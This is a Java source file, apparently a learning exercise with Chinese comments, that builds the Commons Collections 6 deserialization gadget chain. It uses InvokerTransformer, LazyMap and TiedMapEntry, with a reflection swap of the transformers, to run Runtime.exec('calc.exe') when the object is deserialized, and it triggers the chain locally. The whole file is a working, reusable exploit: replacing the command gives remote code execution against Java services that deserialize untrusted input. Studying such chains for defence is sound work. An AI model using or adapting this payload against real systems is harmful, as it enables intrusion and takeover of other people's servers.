import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonCollections6 {
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[]{new
                ConstantTransformer(1)};

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class,
                        Class[].class}, new Object[]{"getRuntime",
                        new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class,
                        Object[].class}, new Object[]{null, new
                        Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class
                },
                        new String[]{"calc.exe"}),
                new ConstantTransformer(1),
        };
        // 和CC1-LazyMap相比，基本没变。只不过这里传的是 fakeTransformers
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        // 引入 TiedMapEntry
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "keyForTest");
        Map expMap = new HashMap();
        expMap.put(tiedMapEntry, "value");
        outerMap.remove("keyForTest");

        // transformers 替换掉 fakeTransformers
        Field f =
                ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

// ==================
// ⽣成序列化字符串,不用动
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();
// 本地测试触发,不用动
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new
                ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }
}